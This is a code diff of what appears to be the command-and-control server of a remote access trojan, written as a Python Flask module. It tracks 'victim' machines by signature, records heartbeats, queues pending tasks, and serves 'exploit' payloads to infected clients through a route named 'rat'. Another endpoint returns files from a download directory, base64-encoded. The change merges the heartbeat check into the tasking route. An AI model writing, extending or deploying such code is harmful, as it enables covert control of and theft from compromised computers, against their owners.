@@ -16,12 +16,10 @@ import payload
 from config import *
 from models import victim, action, upload, settings
 
-
 from flask import Module, request, make_response, render_template_string, render_template
 client = Module(__name__)
 
 server = '%s:%d'%(host, port)
-
 
 def md5(s):
     return hashlib.md5(s).hexdigest()
@@ -38,9 +36,13 @@ def rat(signature):
     if not c.get(signature):
         return 'error'
     if request.method == 'GET':
-        cl = c.get(signature)
-        if not cl:
-            return "error"
+        c = victim.victim()
+        pattern = r"^[0-9a-f]{32}$"
+        if not re.match(pattern, signature):
+            return 'error'
+        if not c.get(signature):
+            return 'error'
+        c.heartbeat(signature)
         #TODO:添加全局任务
 
         #查找未完成任务
@@ -50,7 +52,7 @@ def rat(signature):
             pid = ac['pid']
             a.addrepeat(pid)
         else:
-            exploit = p.heartbeat()
+            exploit = ''
             pid = 'heartbeat'
         return render_template_string(exploit, server=server, signature=signature, pid=pid)
     else:
@@ -104,17 +106,6 @@ def download_controller():
     with open(download_dir+os.sep+filename, 'r') as f:
         data = f.read()
     return base64.b64encode(data)
-
-@client.route("/heartbeat/<signature>", methods=['GET', 'POST'])
-def heartbeat(signature):
-    c = victim.victim()
-    pattern = r"^[0-9a-f]{32}$"
-    if not re.match(pattern, signature):
-        return 'error'
-    if not c.get(signature):
-        return 'error'
-    c.heartbeat(signature)
-    return 'success'
 
 @client.route("/connect", methods=['GET'])
 def connect():
